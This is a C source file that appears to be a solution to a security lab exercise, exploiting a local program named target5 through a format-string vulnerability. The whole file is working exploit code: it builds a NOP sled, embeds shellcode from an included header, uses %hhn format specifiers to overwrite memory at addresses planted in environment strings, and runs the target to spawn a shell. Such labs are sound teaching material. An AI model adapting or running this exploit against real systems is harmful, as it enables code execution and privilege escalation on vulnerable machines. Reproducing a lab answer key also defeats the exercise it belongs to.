#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include "shellcode-64.h"

#define TARGET "../targets/target5"
#define SIZE 200
#define SHELL_OFFSET 4

int main(void) {
    char *args[3];

    args[0] = TARGET;
    args[2] = NULL;

    char arg1[8];
    *(long *)arg1 = 0x3021fea8;
    args[1]       = arg1;

    char str[SIZE];

    // Insert NOPs
    memset(str, 0x90, SIZE);
    memcpy(str, "ffff", 4);

    // Insert shellcode
    for (int i = 0; i < strlen(shellcode); i++) str[i + SHELL_OFFSET] = shellcode[i];

    // Insert manipulation format
    memcpy(str + 50, "%08x%08x%08x%08x", 16);
    memcpy(str + 70, "%078x%hhn%90x%hhn%39x%hhn%15x%hhn", 33);

    char *env[] = {"",
                   "",
                   "",
                   "aaaaaaaa"
                   "\xa9\xfe\x21\x30",
                   "",
                   "",
                   "",
                   "aaaaaaaa"
                   "\xaa\xfe\x21\x30",
                   "",
                   "",
                   "",
                   "aaaaaaaa"
                   "\xab\xfe\x21\x30",
                   "",
                   "",
                   "",
                   str,
                   NULL};


    if (0 > execve(TARGET, args, env))
        fprintf(stderr, "execve failed.\n");

    return 0;
}